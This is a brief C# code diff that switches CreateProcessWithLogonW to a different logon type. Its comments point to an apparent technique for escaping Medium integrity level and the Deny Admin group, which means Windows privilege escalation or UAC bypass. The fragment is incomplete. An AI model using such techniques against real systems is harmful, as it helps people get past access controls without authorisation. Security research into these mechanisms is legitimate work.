@@ -162,10 +162,10 @@ public class TestCode2
 
             StopWow64Redirection(true);
 
-            const int LOGON_WITH_PROFILE = 1;                   // <=========================== CHANGE FROM ORIGINAL TECHNIQUE -- but apparently will not result in 
+            const int LOGON_WITH_PROFILE = 1;                   // <=========================== CHANGE FROM ORIGINAL TECHNIQUE -- but apparently will not result in a Medium IL + Deny Admin group
             const int LOGON_NETCREDENTIALS_ONLY = 2;            // [TBD] **ISSUE**   : ERROR_INVALID_LOGON_TYPE occurs. But this is key according to @splinter_code - https://twitter.com/splinter_code/status/1458260294220845056
 
-            bool didCreate = CreateProcessWithLogonW(userOnly, domainIfSupplied, pwToAdminAccount, LOGON_NETCREDENTIALS_ONLY,
+            bool didCreate = CreateProcessWithLogonW(userOnly, domainIfSupplied, pwToAdminAccount, LOGON_WITH_PROFILE,
                 null, fullCmdLine,
                 (uint)CreationFlags.CREATE_NEW_CONSOLE | (uint)CreationFlags.CREATE_UNICODE_ENVIRONMENT,
                 IntPtr.Zero, null,
